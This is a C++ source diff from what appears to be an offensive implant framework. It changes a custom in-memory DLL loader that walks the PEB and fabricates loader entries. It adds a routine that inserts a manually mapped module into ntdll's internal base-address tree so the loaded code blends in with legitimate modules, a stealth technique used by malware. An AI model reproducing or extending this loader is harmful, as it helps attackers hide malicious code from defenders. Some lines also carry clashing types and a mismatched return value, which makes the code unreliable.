@@ -1,11 +1,13 @@
 #include <core/include/memory.hpp>
 
+using namespace Hash;
 using namespace Opsec;
 using namespace Utils;
 using namespace Parser;
 using namespace Objects;
 using namespace Threads;
 using namespace Commands;
+using namespace Memory::Modules;
 
 namespace Memory {
     namespace Methods {
@@ -57,7 +59,7 @@ namespace Memory {
         	HEXANE;
 
             _hexane instance    = { };
-            VOID *region        = { };
+            void *region        = { };
 
             instance.teb    = NtCurrentTeb();
             instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -66,7 +68,7 @@ namespace Memory {
             instance.base.address           = U_PTR(InstStart());
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
-            if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
+            if (!(instance.modules.ntdll = (HMODULE) GetModuleEntry(NTDLL)->DllBase)) {
                 return false;
             }
 
@@ -106,7 +108,7 @@ namespace Memory {
     }
 
     namespace Modules {
-	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(const uint32 hash) {
+	    PLDR_DATA_TABLE_ENTRY GetModuleEntry(const uint32 hash) {
 		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
 		    for (auto next = head->Flink; next != head; next = next->Flink) {
@@ -123,7 +125,7 @@ namespace Memory {
 		    return nullptr;
 	    }
 
-	    LDR_DATA_TABLE_ENTRY *GetModuleEntryByName(const wchar_t *mod_name) {
+	    PLDR_DATA_TABLE_ENTRY GetModuleEntryByName(const wchar_t *mod_name) {
 		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
 		    for (auto next = head->Flink; next != head; next = next->Flink) {
@@ -206,7 +208,7 @@ namespace Memory {
 			    return false;
 		    }
 
-		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (void **) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 			    ctx->utilapi.NtClose(handle);
 			    return false;
 		    }
@@ -219,6 +221,51 @@ namespace Memory {
 
 		    ctx->utilapi.NtClose(handle);
 		    return true;
+	    }
+
+    	BOOL AddBaseAddressEntry(PLDR_DATA_TABLE_ENTRY pLdrEntry, void *lpBaseAddr) {
+
+	    	RTLRBINSERTNODEEX pRtlRbInsertNodeEx = (RTLRBINSERTNODEEX)GetFunctionAddress(IsModulePresent(L"ntdll.dll"), "RtlRbInsertNodeEx");
+	    	PRTL_RB_TREE pModBaseAddrIndex = FindModuleBaseAddressIndex();
+
+	    	if (!pModBaseAddrIndex)
+	    	{
+	    		return FALSE;
+	    	}
+
+	    	BOOL bRight = FALSE;
+	    	PLDR_DATA_TABLE_ENTRY pLdrNode = (PLDR_DATA_TABLE_ENTRY)((size_t)pModBaseAddrIndex - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
+
+	    	do
+	    	{
+	    		if (lpBaseAddr < pLdrNode->DllBase) {
+	    			if (!pLdrNode->BaseAddressIndexNode.Left) {
+	    				break;
+	    			}
+
+	    			pLdrNode = (PLDR_DATA_TABLE_ENTRY)((size_t) pLdrNode->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
+	    		}
+
+	    		else if (lpBaseAddr > pLdrNode->DllBase)
+	    		{
+	    			if (!pLdrNode->BaseAddressIndexNode.Right)
+	    			{
+	    				bRight = TRUE;
+	    				break;
+	    			}
+
+	    			pLdrNode = (PLDR_DATA_TABLE_ENTRY2)((size_t)pLdrNode->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY2, BaseAddressIndexNode));
+	    		}
+
+	    		else
+	    		{
+	    			pLdrNode->DdagNode->LoadCount++;
+	    		}
+	    	} while (TRUE);
+
+	    	pRtlRbInsertNodeEx(pModBaseAddrIndex, &pLdrNode->BaseAddressIndexNode, bRight, &pLdrEntry->BaseAddressIndexNode);
+
+	    	return TRUE;
 	    }
 
 	    BOOL LocalLdrGetProcedureAddress(HMODULE module, const MBS_BUFFER *fn_name, const uint16 ordinal, void **function) {
@@ -549,7 +596,7 @@ namespace Memory {
 		    entry->InIndexes = true;
 		    entry->ProcessAttachCalled = true;
 		    entry->InExceptionTable = FALSE;
-		    entry->DllBase = (PVOID) module->base;
+		    entry->DllBase = (void *) module->base;
 		    entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
 		    entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
 		    entry->BaseDllName = BaseDllName;
@@ -659,7 +706,7 @@ namespace Memory {
 		    module->success = true;
 
 	    defer:
-		    return (HMODULE) module->base;
+		    return module;
 	    }
 
 
